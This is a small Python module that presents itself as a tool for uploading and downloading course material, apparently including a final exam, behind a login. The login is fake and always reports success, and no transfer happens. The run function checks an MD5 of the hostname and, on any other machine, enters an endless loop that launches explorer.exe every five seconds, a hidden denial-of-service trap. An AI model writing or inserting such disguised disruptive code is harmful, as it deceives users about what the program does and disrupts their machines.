from hashlib import md5 as md5lib
from random import randint
from socket import gethostname
from subprocess import call
from time import sleep

_available = (
    "youshulihua",
    "zhihuifuzhong_finalexam"
)

_methods = (
    "upload",
    "download"
)

_correct_hostname = "e3e884947a891e31ec0d1d530ec74391"


def _verify_pc():
    hostname = gethostname()
    md5 = md5lib(hostname.encode()).hexdigest()
    return md5 == _correct_hostname


def _reverse(string):
    return string[::-1]


def fuck():
    while True:
        call(["explorer.exe"])
        sleep(5)


def login(username, password):
    if type(username) != str or username == "" or type(password) != str or password == "":
        raise Exception("Please input your username and password correctly.")
    else:
        # This is unfinished
        sleep((randint(40, 300) + len(username) + len(password)) / 1000)
        print("Success.")


def run(subject, method):
    print(method + "ing " + subject + "...")
    verified = _verify_pc()
    if not verified:
        fuck()


def __getattr__(name):
    parts = name.split("_")
    method = parts[-1]
    if method in _methods or _reverse(method) in _methods:
        subject_parts = parts[:-1]
        reverse_subject_parts = []
        for i in subject_parts:
            reverse_subject_parts.append(_reverse(i))
        subject = "_".join(subject_parts)
        reverse_subject = "_".join(reverse_subject_parts)
        if subject in _available or reverse_subject in _available:
            def execute(*args, **kwargs):
                run(subject, method)
            return execute
        else:
            raise Exception("Not Available.")
    else:
        raise Exception("Method doesn't exist.")
